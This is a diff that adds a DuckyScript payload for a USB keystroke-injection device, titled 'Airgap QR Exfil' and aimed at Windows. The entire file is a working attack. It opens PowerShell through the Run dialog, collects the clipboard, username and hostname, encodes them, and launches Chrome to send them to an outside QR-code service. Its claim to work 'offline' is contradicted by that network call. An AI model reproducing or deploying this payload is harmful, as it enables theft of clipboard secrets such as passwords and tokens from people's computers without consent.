@@ -1,0 +1,28 @@
+REM Payload: Airgap QR Exfil
+REM Author: Alessandro
+REM Description: Exfiltrates clipboard and system info via QR code offline
+REM Target: Windows
+
+REM ---- PASSIVE_WINDOWS_DETECT EXTENSION (INLINE) ----
+INJECT_MOD WINDOWS
+DELAY 100
+STRING r
+DELAY 100
+ENTER
+DELAY 500
+
+REM ---- BEGIN PAYLOAD ----
+STRING powershell
+ENTER
+DELAY 800
+
+STRINGLN_POWERSHELL
+Add-Type -AssemblyName System.Web
+$clip = Get-Clipboard -Raw
+$user = $env:USERNAME
+$hostname = $env:COMPUTERNAME
+$time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+$data = "[$time][$user@$hostname] $clip"
+$encoded = [System.Web.HttpUtility]::UrlEncode([Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($data)))
+Start-Process chrome "--new-window https://api.qrserver.com/v1/create-qr-code/?size=400x400&data=$encoded"
+END_STRINGLN
